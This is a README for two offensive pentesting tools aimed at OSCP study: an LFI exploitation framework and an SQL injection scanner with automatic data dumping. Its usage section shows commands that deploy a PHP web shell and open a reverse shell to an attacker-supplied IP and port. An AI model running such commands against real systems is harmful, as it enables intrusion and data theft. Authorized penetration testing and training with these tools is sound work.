# SD-DEVSECOPS: Advanced Pentesting Checkers Suite

A collection of high-performance, automated security tools designed for rapid enumeration, vulnerability discovery, and exploitation. Built by security professionals for the **OSCP** and beyond.

---

## 🛠️ Included Tools

### 1. LFI-FILLER (v3.1)
The ultimate framework for Local File Inclusion discovery and exploitation.
- **Key Features**: Multi-threaded, WAF Bypasses, PHP Filter Chaining, Log/SSH Poisoning, Automated Shells.
- **Main Script**: `lfiller.py`
- **[Quick Usage Guide Pin](#-lfi-filler-v31-quick-usage)**

### 2. SQLI-FILLER (v1.0 - OSCP Edition)
High-speed SQL injection scanner and automated exfiltration tool.
- **Key Features**: Error/Time/Boolean-blind detection, UNION column discovery, Auto-Data Dump, WAF Tamper scripts.
- **Main Script**: `sqlifiller.py`
- **[Quick Usage Guide Pin](#-sqli-filler-v10-quick-usage)**

---

## 🚀 LFI-FILLER v3.1 Quick Usage

Scan and attempt to deploy a PHP web shell:
```bash
python3 lfiller.py -u "http://target.com/view.php" -webshell
```

Reverse shell via LHost:
```bash
python3 lfiller.py -u "http://target.com/view.php" -lh YOUR_IP -lp 4444
```

---

## 🚀 SQLI-FILLER v1.0 Quick Usage

Fast scan and automated data exfiltration:
```bash
python3 sqlifiller.py -u "http://target.com/products.php?id=1"
```

POST-based injection test:
```bash
python3 sqlifiller.py -u "http://target.com/login.php" -m POST -d "user=admin&pass=123"
```

---

## 🧪 Advanced Features Comparison

| Feature | LFI-FILLER | SQLI-FILLER |
|---------|------------|-------------|
| **Multi-threading** | ✅ | ✅ |
| **WAF Bypass** | ✅ (Encoding) | ✅ (Tamper) |
| **RCE Vectors** | 10+ | ✅ (Outfile/CMDShell) |
| **Auto-Exploitation** | ✅ | ✅ |
| **OSCP Ready** | ✅ | ✅ |

## 📦 Installation

```bash
git clone https://github.com/SD-DEVSECOPS/CHECKERS.git
cd CHECKERS
pip install requests
```

## ⚠️ Disclaimer

This suite is for educational purposes and authorized penetration testing only. Unauthorized use against systems you do not have permission to test is illegal. The author is not responsible for any misuse or damage caused by these utilities.

---
**Maintained by SD-DEVSECOPS**
